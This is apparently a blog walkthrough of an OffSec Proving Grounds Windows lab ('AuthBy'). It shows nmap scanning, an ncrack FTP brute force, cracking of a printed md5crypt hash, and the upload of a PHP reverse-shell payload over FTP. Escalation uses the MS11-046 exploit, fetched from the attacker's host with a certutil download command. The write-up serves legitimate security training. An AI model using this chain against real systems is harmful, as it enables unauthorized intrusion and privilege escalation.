---
title: AuthBy
date: 2026-01-01T12:00:04+01:00
draft: false
tags:
  - offsec
  - nmap
  - windows
  - ftp
  - proving-grounds
  - RDP
  - ncrack
  - escalation
categories:
  - Pentesting
  - Offsec
  - Windows
description: "This guide provides readers with the solution to the Proving Grounds Lab: Hepet"
---

Start with a scan

Looks like we have: ftp(21), ??(242), ??(3145), RDP(3389)

Deeper scan
	` nmap -A -p 21 192.168.184.46 `
FTP
![](Screenshot%202025-12-18%20at%2007.46.03.png)


RDP
	` nmap -A -p 3389 192.168.184.46
	
![](Screenshot%202025-12-18%20at%2007.57.39.png)

Something on port 242 asking for creds. http - apache - php - windows

![](Screenshot%202025-12-18%20at%2007.55.15.png)![](Screenshot%202025-12-18%20at%2008.02.17.png)

My feeling is that we will get some creds from the ftp service, slap them into the 

Nutcracker:

`ncrack -U /usr/share/wordlists/metasploit/http_default_users.txt  -P /usr/share/wordlists/metasploit/http_default_pass.txt ftp://192.168.184.46`

![](Screenshot%202025-12-18%20at%2009.53.56.png)


“He who wishes to eat the kernel, breaks the nut.”

Once inside we have see a couple of interesting files. 

![](Screenshot%202025-12-18%20at%2012.05.54.png)

![](Screenshot%202025-12-18%20at%2012.06.54.png)

`echo 'offsec:$apr1$oRfRsc/K$UpYpplHDlaemqseM39Ugg0' > hash.txt`

`john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`

md5crypt hash :_|

![](Screenshot%202025-12-18%20at%2012.09.44.png)

![](Screenshot%202025-12-18%20at%2012.08.53.png)

Time to create a payload:
![](Screenshot%202025-12-18%20at%2015.00.57.png)

Login:

`ftp admin@192.168.184.46`

`put payload.php`

![](Screenshot%202025-12-18%20at%2015.03.38.png)

Input your credentials:

offsec:elite

`http://192.168.184.46:242/rev.php`


Check the systeminfo and privs:
	`systeminfo`
	`whoami /all
	
![](Screenshot%202026-01-19%20at%2013.57.37.png)

Before you go as far in the wrong direction as I did, check the OS version for exploits. 

google: `6.0.6001 Service Pack 1 Build 6001 exploit github`

![](Screenshot%202026-01-19%20at%2013.59.21.png)

We could compile this but.... 

google: `MS11-046 exploit github 32bit x86`
	
![](Screenshot%202026-01-19%20at%2014.01.25.png)

Download the ms11-46.exe file

![](Screenshot%202026-01-19%20at%2014.02.05.png)

Move the exploit over and execute: 

`certutil -f -urlcache  http://192.168.45.168/ms11-046.exe ms11.exe`
	
![](Screenshot%202026-01-19%20at%2014.08.01.png)

I really struggled with this one: 27 hours

